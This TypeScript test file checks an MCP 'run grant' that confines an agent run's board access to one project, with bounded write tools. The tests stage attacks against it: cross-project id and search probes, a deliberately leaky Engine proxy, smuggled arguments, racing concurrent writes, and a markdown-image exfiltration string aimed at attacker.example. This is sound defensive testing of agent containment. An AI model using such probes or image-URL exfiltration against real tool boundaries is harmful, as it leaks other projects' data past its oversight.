import { afterAll, beforeAll, expect, test } from 'bun:test';

import type { Engine } from '@mimir/contract';
import {
  createInitiative,
  createPhase,
  createProject,
  createTask,
  depend,
  fileSeed,
  LocalEngine,
  queueTask,
} from '@mimir/core';
import { createTestStore } from '@mimir/core/testing';
import type { TestStore } from '@mimir/core/testing';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';

import {
  ATTACH_LIMITS,
  createRunGrant,
  GRANT_SERVER,
  grantToolNames,
  NOTE_CHARACTERS,
  NOTES_PER_RUN,
  OUTSIDE_PROJECT,
} from './agent-grant';
import type { RunGrantOptions } from './agent-grant';

/*
 * The run grant is a run's whole board access (ADR 0041). Every call goes
 * through a real MCP client, so input validation runs as it does when the CLI
 * calls the grant. Each test names an attack and the refusal it must meet.
 */

let fixture: TestStore;
let engine: LocalEngine;
let phase: string;
let other: { task: string; artifact: string; seed: string };
let seed: string;

beforeAll(async () => {
  fixture = await createTestStore();
  engine = new LocalEngine(fixture.store);
  const { store } = fixture;
  await createProject(store, { key: 'ENG', name: 'Engine' });
  await createProject(store, { key: 'OTH', name: 'Other' });
  const initiative = await createInitiative(store, { projectId: 'ENG', title: 'Agents' });
  phase = (await createPhase(store, { parentId: initiative.id, title: 'Runner' })).id;
  const otherInitiative = await createInitiative(store, {
    projectId: 'OTH',
    title: 'Secret plans',
  });
  const otherPhase = await createPhase(store, { parentId: otherInitiative.id, title: 'Hidden' });
  const otherTask = await createTask(store, {
    parentId: otherPhase.id,
    title: 'Other secret task',
  });
  const otherArtifact = await engine.attach({
    content: 'other secret content',
    project: 'OTH',
    title: 'Other secret artifact',
  });
  const otherSeed = await fileSeed(store, {
    kind: 'idea',
    project: 'OTH',
    title: 'Other secret seed',
  });
  other = { artifact: otherArtifact.id, seed: otherSeed.id, task: otherTask.id };
  seed = (await fileSeed(store, { kind: 'idea', project: 'ENG', title: 'An engine idea' })).id;
});

afterAll(async () => {
  await fixture.close();
});

/** A fresh todo task in ENG for one run. */
async function newTask(title = 'Groom me') {
  return (await createTask(fixture.store, { parentId: phase, title })).id;
}

/** A grant for `task`, connected to an MCP client; `row` decides what checkRow answers. */
async function grant(task: string, overrides: Partial<RunGrantOptions> = {}) {
  const state = { checks: 0, lost: 0, row: 'held' as 'held' | 'lost' };
  const server = createRunGrant({
    checkRow: async () => {
      state.checks += 1;
      return state.row;
    },
    engine,
    onLost: () => {
      state.lost += 1;
    },
    project: 'ENG',
    task,
    ...overrides,
  });
  const [serverSide, clientSide] = InMemoryTransport.createLinkedPair();
  await server.instance.connect(serverSide);
  const client = new Client({ name: 'grant-test', version: '1.0.0' });
  await client.connect(clientSide);
  /** Call one grant tool; the answer's text and whether it was refused. */
  const call = async (name: string, args: Record<string, unknown> = {}) => {
    try {
      const result = await client.callTool({ arguments: args, name });
      const content = result.content as { type: string; text: string }[];
      return {
        refused: result.isError === true,
        text: content.map((part) => part.text).join('\n'),
      };
    } catch (error) {
      // A protocol-level refusal, such as an unknown tool, is a refusal too.
      return { refused: true, text: error instanceof Error ? error.message : String(error) };
    }
  };
  return { call, client, server, state };
}

/** The node a successful call answered with. */
function json(answer: { refused: boolean; text: string }) {
  expect(answer.refused).toBe(false);
  return JSON.parse(answer.text);
}

test('the grant exposes exactly its reads and its three writes', async () => {
  const task = await newTask();
  const { client, server } = await grant(task);
  expect(server.name).toBe(GRANT_SERVER);
  const { tools } = await client.listTools();
  expect(tools.map((tool) => tool.name).toSorted()).toEqual(
    [
      'annotate',
      'artifact',
      'artifacts',
      'attach',
      'get',
      'groom',
      'list',
      'search',
      'seeds',
      'tree',
    ].toSorted(),
  );
  expect(grantToolNames.toSorted()).toEqual(
    tools.map((tool) => `mcp__${GRANT_SERVER}__${tool.name}`).toSorted(),
  );
});

test('reads answer within the run project', async () => {
  const task = await newTask('Readable task');
  const { call } = await grant(task);
  expect(json(await call('get', { id: task }))).toMatchObject({ id: task, title: 'Readable task' });
  expect(json(await call('get', { id: 'ENG' }))).toMatchObject({ id: 'ENG' });
  expect(json(await call('get', { id: seed }))).toMatchObject({ id: seed, project: 'ENG' });
  const listed = json(await call('list', { q: 'Readable' }));
  expect(listed.items.map((item: { id: string }) => item.id)).toContain(task);
  expect(json(await call('tree', {}))).toMatchObject({ id: 'ENG' });
  expect(json(await call('search', { query: 'Readable' })).items.length).toBeGreaterThan(0);
  expect(json(await call('seeds', {})).map((entry: { id: string }) => entry.id)).toContain(seed);
  expect(json(await call('artifacts', {}))).toMatchObject({ items: expect.any(Array) });
});

test('a read never reaches another project, however the id or query is phrased', async () => {
  const task = await newTask();
  const { call } = await grant(task);
  for (const id of [other.task, other.artifact, other.seed, 'OTH', 'eng-1', `${task} `, '']) {
    const answer = await call('get', { id });
    expect(answer.refused).toBe(true);
    expect(answer.text).not.toContain('secret');
  }
  expect((await call('tree', { id: 'OTH' })).refused).toBe(true);
  expect((await call('artifact', { id: other.artifact })).refused).toBe(true);
  for (const [name, args] of [
    ['list', { q: 'secret' }],
    ['search', { query: 'secret' }],
    ['artifacts', { q: 'secret' }],
    ['seeds', {}],
    ['tree', {}],
  ] as const) {
    const answer = await call(name, args);
    expect(answer.refused).toBe(false);
    expect(answer.text).not.toContain('secret');
  }
});

test('a read refuses a project argument instead of honoring it', async () => {
  const { call } = await grant(await newTask());
  for (const name of ['list', 'search', 'artifacts', 'seeds']) {
    const answer = await call(name, { project: 'OTH', query: 'secret' });
    expect(answer.refused).toBe(true);
    expect(answer.text).not.toContain('Other secret');
  }
});

test('a cross-project dependency reads as awaiting on a record outside the project', async () => {
  const task = await newTask();
  await depend(fixture.store, task, [other.task]);
  const { call } = await grant(task);
  const answer = await call('get', { id: task });
  const node = json(answer);
  expect(node.status).toBe('awaiting');
  expect(node.deps.awaitingOn).toEqual([{ id: OUTSIDE_PROJECT }]);
  expect(node.deps.dependsOn).toEqual([{ id: OUTSIDE_PROJECT }]);
  expect(answer.text).not.toContain(other.task);
  expect(answer.text).not.toContain('secret');
  // The other side sees its dependent the same way, from inside its own project.
  const blocker = await newTask('Blocks a foreign task');
  await depend(fixture.store, other.task, [blocker]);
  const blocking = json(
    await grant(blocker).then(({ call: read }) => read('get', { id: blocker })),
  );
  expect(blocking.deps.blocking).toEqual([{ id: OUTSIDE_PROJECT }]);
});

test('an upstream seed on another board reads as outside the project, not as none', async () => {
  const task = (
    await createTask(fixture.store, { parentId: phase, title: 'Spawned', upstream: other.seed })
  ).id;
  const { call } = await grant(task);
  const answer = await call('get', { id: task });
  expect(json(answer).upstream).toBe(OUTSIDE_PROJECT);
  expect(answer.text).not.toContain(other.seed);
});

test('a seed another board filed reads its requester as outside the project', async () => {
  const asked = (
    await fileSeed(fixture.store, {
      kind: 'idea',
      project: 'ENG',
      requester: 'OTH',
      title: 'Asked for by another board',
    })
  ).id;
  const { call } = await grant(await newTask());
  const read = await call('get', { id: asked });
  expect(json(read).requester).toBe(OUTSIDE_PROJECT);
  const listed = await call('seeds');
  const found = json(listed).find((item: { id: string }) => item.id === asked);
  expect(found.requester).toBe(OUTSIDE_PROJECT);
  expect(`${read.text}${listed.text}`).not.toContain('OTH');
  // A requester filter would probe which boards filed seeds here.
  expect((await call('seeds', { requester: 'OTH' })).refused).toBe(true);
});

test('search answers only for the project, in its items and its counts', async () => {
  const task = await newTask('Waits on a foreign task');
  await depend(fixture.store, task, [other.task]);
  const { call } = await grant(task);
  const byId = json(await call('search', { query: other.task }));
  expect(byId.items).toEqual([]);
  expect(byId.total).toBe(0);
  expect(byId.returned).toBe(0);
  // A hit through a link would say which in-project record links the foreign one.
  const byTitle = await call('search', { query: 'Other secret task' });
  const set = json(byTitle);
  expect(set.items.filter((hit: { match: string }) => hit.match === 'link')).toEqual([]);
  expect(set.total).toBe(set.items.length);
  expect(byTitle.text).not.toContain(other.task);
});

/** One read's answer for ENG with OTH's items appended. */
async function both<T extends { items: unknown[] }>(read: (project: string) => Promise<T>) {
  const [own, foreign] = await Promise.all([read('ENG'), read('OTH')]);
  const counts = own as unknown as { returned?: number; total?: number };
  const more = foreign as unknown as { returned?: number; total?: number };
  return {
    ...own,
    items: [...own.items, ...foreign.items],
    // A wider answer counts the foreign records too, as a real one would.
    ...(counts.total === undefined
      ? {}
      : {
          returned: (counts.returned ?? 0) + (more.returned ?? 0),
          total: counts.total + (more.total ?? 0),
        }),
  };
}

/*
 * An Engine that answers wider than asked: every project-scoped read also
 * returns OTH's records, a tree gains OTH as a child, and ENG-9999 resolves to
 * OTH's task. The grant must hold the project boundary on its own.
 */
function leakyEngine(): Engine {
  const overrides: Partial<Engine> = {
    artifacts: (args) => both((project) => engine.artifacts({ ...args, project })),
    getArtifact: async (args) => {
      const found = await engine.getArtifact(args);
      return { ...found, links: [...found.links, other.task] };
    },
    getNode: (args) => engine.getNode(args.id === 'ENG-9999' ? { ...args, id: other.task } : args),
    getSeed: async (args) => {
      const found = await engine.getSeed(args);
      return { ...found, spawned: [...found.spawned, other.task] };
    },
    list: (args) => both((project) => engine.list({ ...args, project })),
    search: (args) => both((project) => engine.search({ ...args, project })),
    seeds: async (args) => [
      ...(await engine.seeds({ ...args, project: 'ENG' })),
      ...(await engine.seeds({ ...args, project: 'OTH' })),
    ],
    tree: async (args) => {
      const own = await engine.tree(args);
      return { ...own, children: [...own.children, await engine.tree({ id: 'OTH' })] };
    },
  };
  return new Proxy(engine, {
    get: (target, key, receiver) =>
      Object.hasOwn(overrides, key)
        ? overrides[key as keyof Engine]
        : Reflect.get(target, key, receiver),
  });
}

test('a read holds the project boundary even when the Engine answers wider', async () => {
  const task = await newTask();
  const { call } = await grant(task, { engine: leakyEngine() });
  for (const [name, args] of [
    ['list', {}],
    ['search', { query: 'secret' }],
    ['artifacts', {}],
    ['seeds', {}],
    ['tree', {}],
  ] as const) {
    const answer = await call(name, args);
    expect(answer.refused).toBe(false);
    expect(answer.text.toLowerCase()).not.toContain('secret');
    expect(answer.text).not.toContain('OTH');
  }
  // A link or spawned task in another project is redacted, not shown.
  const plan = await engine.attach({
    content: 'x',
    links: [task],
    project: 'ENG',
    title: 'Linked',
  });
  for (const [name, id] of [
    ['get', plan.id],
    ['artifact', plan.id],
    ['get', seed],
  ] as const) {
    const answer = await call(name, { id });
    expect(answer.text).not.toContain(other.task);
    expect(answer.text).toContain(OUTSIDE_PROJECT);
  }
  const homed = await call('get', { id: 'ENG-9999' });
  expect(homed.refused).toBe(true);
  expect(homed.text.toLowerCase()).not.toContain('secret');
});

test('list and artifacts count only what they return when the Engine answers wider', async () => {
  const task = await newTask();
  const { call } = await grant(task, { engine: leakyEngine() });
  for (const [name, read] of [
    ['list', () => engine.list({ project: 'ENG' })],
    ['artifacts', () => engine.artifacts({ project: 'ENG' })],
  ] as const) {
    const own = await read();
    const set = json(await call(name));
    expect(set.returned).toBe(set.items.length);
    expect(set.total).toBe(own.total);
  }
});

test('a run writes a bounded number of notes and grooming states', async () => {
  const task = await newTask();
  const { call } = await grant(task);
  const writes = Array.from({ length: NOTES_PER_RUN }, (_, n) =>
    n % 2 === 0
      ? call('annotate', { content: `note ${n}` })
      : call('groom', { note: `why ${n}`, state: 'needs_answers' }),
  );
  // Sent together, so the limit holds for concurrent calls too.
  const answers = await Promise.all([...writes, call('annotate', { content: 'one too many' })]);
  expect(answers.filter((answer) => answer.refused)).toHaveLength(1);
  expect((await call('groom', { state: 'groomed' })).refused).toBe(true);
});

test('annotate writes a note on the run task, after checking the row', async () => {
  const task = await newTask();
  const { call, state } = await grant(task);
  expect((await call('annotate', { content: 'Surveyed the code.' })).refused).toBe(false);
  expect((await call('annotate', { content: 'Again.', id: task })).refused).toBe(false);
  expect(state.checks).toBe(2);
  const node = await engine.getNode({ facets: ['annotations'], id: task });
  expect(node.annotations?.map((note) => note.content)).toEqual(['Surveyed the code.', 'Again.']);
});

test('annotate refuses any other id, unwritten and unchecked', async () => {
  const task = await newTask();
  const target = await newTask('Not the run task');
  const { call, state } = await grant(task);
  for (const id of [target, other.task, 'ENG', '']) {
    expect((await call('annotate', { content: 'stray', id })).refused).toBe(true);
  }
  expect(state.checks).toBe(0);
  const node = await engine.getNode({ facets: ['annotations'], id: target });
  expect(node.annotations ?? []).toEqual([]);
});

test('groom sets the run task grooming state with its note', async () => {
  const task = await newTask();
  const { call } = await grant(task);
  expect((await call('groom', { note: 'Ready to build.', state: 'groomed' })).refused).toBe(false);
  // The core's rules hold: needs_answers needs a note naming the questions.
  expect((await call('groom', { ids: [task], state: 'needs_answers' })).refused).toBe(true);
  expect(
    (await call('groom', { ids: [task], note: 'Which store?', state: 'needs_answers' })).refused,
  ).toBe(false);
  const node = await engine.getNode({ facets: ['annotations'], id: task });
  expect(node.grooming).toBe('needs_answers');
  expect(node.annotations?.some((note) => note.content.includes('Ready to build.'))).toBe(true);
});

test('a groom batch with one stray id is refused whole', async () => {
  const task = await newTask();
  const stray = await newTask('Stray');
  const { call, state } = await grant(task);
  expect((await call('groom', { ids: [task, stray], state: 'groomed' })).refused).toBe(true);
  expect((await call('groom', { ids: [stray], state: 'groomed' })).refused).toBe(true);
  expect((await call('groom', { ids: [], state: 'groomed' })).refused).toBe(true);
  expect(state.checks).toBe(0);
  expect((await engine.getNode({ id: task })).grooming).toBe('not_groomed');
  expect((await engine.getNode({ id: stray })).grooming).toBe('not_groomed');
});

test('groom refuses a task that has left todo', async () => {
  const task = await newTask();
  await queueTask(fixture.store, task, { harness: 'claude', session: 'operator' });
  const { call } = await grant(task);
  const answer = await call('groom', { state: 'groomed' });
  expect(answer.refused).toBe(true);
  expect(answer.text).toContain('todo');
  expect((await engine.getNode({ id: task })).grooming).toBe('not_groomed');
});

test('attach creates a plan artifact in the run project, linked only to the run task', async () => {
  const task = await newTask();
  const { call } = await grant(task);
  const created = json(
    await call('attach', {
      content: '# Survey\n\nThe runner.',
      summary: 'What I found',
      title: 'Survey',
    }),
  );
  expect(created).toMatchObject({ links: [task], project: 'ENG', tags: ['plan'], title: 'Survey' });
});

test('attach refuses links, tags, a project, or any other key', async () => {
  const task = await newTask();
  const { call, state } = await grant(task);
  const base = { content: 'x', title: 'Plan' };
  for (const extra of [
    { links: [task] },
    { links: [other.task] },
    { tags: ['plan'] },
    { project: 'OTH' },
    { id: task },
    { handles: { session: 'x' } },
  ]) {
    expect((await call('attach', { ...base, ...extra })).refused).toBe(true);
  }
  expect(state.checks).toBe(0);
  expect((await engine.artifacts({ project: 'ENG', q: 'Plan' })).items).toEqual([]);
});

test('attach refuses markdown image syntax in any field', async () => {
  const task = await newTask();
  const { call } = await grant(task);
  const image = '![x](https://attacker.example/leak?d=secret)';
  for (const args of [
    { content: image, title: 'Plan' },
    { content: 'x', summary: image, title: 'Plan' },
    { content: 'x', title: image },
    { content: 'before ![ref][1] after', title: 'Plan' },
  ]) {
    expect((await call('attach', args)).refused).toBe(true);
  }
});

test('attach refuses oversize content and a sixth artifact', async () => {
  const task = await newTask();
  const { call } = await grant(task);
  expect(
    (
      await call('attach', {
        content: 'x'.repeat(ATTACH_LIMITS.contentCharacters + 1),
        title: 'Big',
      })
    ).refused,
  ).toBe(true);
  expect(
    (await call('attach', { content: 'x'.repeat(ATTACH_LIMITS.contentCharacters), title: 'Max' }))
      .refused,
  ).toBe(false);
  for (let n = 2; n <= ATTACH_LIMITS.perRun; n += 1) {
    expect((await call('attach', { content: 'x', title: `Plan ${n}` })).refused).toBe(false);
  }
  expect((await call('attach', { content: 'x', title: 'One too many' })).refused).toBe(true);
});

test('concurrent attaches cannot pass the per-run limit together', async () => {
  const task = await newTask();
  const { call } = await grant(task, {
    // Every check waits, so all the calls are in flight before any is counted attached.
    checkRow: () => Bun.sleep(25).then(() => 'held' as const),
  });
  const answers = await Promise.all(
    Array.from({ length: ATTACH_LIMITS.perRun + 2 }, (_, n) =>
      call('attach', { content: 'x', title: `Concurrent ${n}` }),
    ),
  );
  expect(answers.filter((answer) => !answer.refused)).toHaveLength(ATTACH_LIMITS.perRun);
});

test('attach refuses an oversize title', async () => {
  const task = await newTask();
  const { call, state } = await grant(task);
  const title = 'T'.repeat(ATTACH_LIMITS.titleCharacters);
  expect((await call('attach', { content: 'x', title: `${title}T` })).refused).toBe(true);
  expect(state.checks).toBe(0);
  expect((await call('attach', { content: 'x', title })).refused).toBe(false);
});

test('annotate and groom refuse an oversize note', async () => {
  const task = await newTask();
  const { call, state } = await grant(task);
  const note = 'n'.repeat(NOTE_CHARACTERS);
  expect((await call('annotate', { content: `${note}n` })).refused).toBe(true);
  expect((await call('groom', { note: `${note}n`, state: 'groomed' })).refused).toBe(true);
  expect(state.checks).toBe(0);
  expect((await call('annotate', { content: note })).refused).toBe(false);
  expect((await call('groom', { note, state: 'groomed' })).refused).toBe(false);
});

test('each write tool states its size limits', async () => {
  const { client } = await grant(await newTask());
  const { tools } = await client.listTools();
  const described = (name: string) => tools.find((found) => found.name === name)?.description;
  expect(described('attach')).toContain(String(ATTACH_LIMITS.titleCharacters));
  expect(described('attach')).toContain(String(ATTACH_LIMITS.contentCharacters));
  expect(described('annotate')).toContain(String(NOTE_CHARACTERS));
  expect(described('groom')).toContain(String(NOTE_CHARACTERS));
  expect(described('get')).toContain(OUTSIDE_PROJECT);
});

test('a lost row refuses every write and tells the runner', async () => {
  const task = await newTask();
  const { call, state } = await grant(task);
  state.row = 'lost';
  expect((await call('annotate', { content: 'late note' })).refused).toBe(true);
  expect((await call('groom', { state: 'groomed' })).refused).toBe(true);
  expect((await call('attach', { content: 'x', title: 'Late plan' })).refused).toBe(true);
  expect(state.lost).toBe(3);
  const node = await engine.getNode({ facets: ['annotations'], id: task });
  expect(node.annotations ?? []).toEqual([]);
  expect(node.grooming).toBe('not_groomed');
  // Reads need no row check.
  expect((await call('get', { id: task })).refused).toBe(false);
});

test('a row check that fails refuses the write without reporting the row lost', async () => {
  const task = await newTask();
  const granted = await grant(task, {
    checkRow: async () => {
      throw new Error('database unavailable');
    },
  });
  const { call, state } = granted;
  expect((await call('annotate', { content: 'note' })).refused).toBe(true);
  // A check that fails is not a lost row: the runner is not told to abort.
  expect(state.lost).toBe(0);
  const node = await engine.getNode({ facets: ['annotations'], id: task });
  expect(node.annotations ?? []).toEqual([]);
});

test('no other Engine verb is reachable', async () => {
  const task = await newTask();
  const { call } = await grant(task);
  for (const name of [
    'create',
    'update',
    'updateArtifact',
    'start',
    'done',
    'move',
    'tag',
    'depend',
  ]) {
    expect((await call(name, { id: task })).refused).toBe(true);
  }
});

test("search answers the same whether another project's id or key exists or not", async () => {
  const { call } = await grant(await newTask());
  // The run plants a title naming real and made-up foreign ids, then probes with them.
  json(
    await call('attach', {
      content: 'probe',
      title: `Notes on ${other.task} OTH-999 ${other.seed} OTH-s999 OTH ZZZ`,
    }),
  );
  const answer = async (query: string) => json(await call('search', { query })).items;
  expect(await answer(other.task)).toEqual(await answer('OTH-999'));
  expect(await answer(other.seed)).toEqual(await answer('OTH-s999'));
  // A bare key gets the project's text search for that word, as a made-up key does.
  expect(await answer('OTH')).toEqual(await answer('OTH OTH'));
  expect(await answer('ZZZ')).toEqual(await answer('ZZZ ZZZ'));
  expect(await answer(other.task.toLowerCase())).toEqual(await answer('oth-999'));
  // The probe title is still found, so the answer is the project's own text search.
  expect((await answer('ZZZ')).length).toBe(1);
});
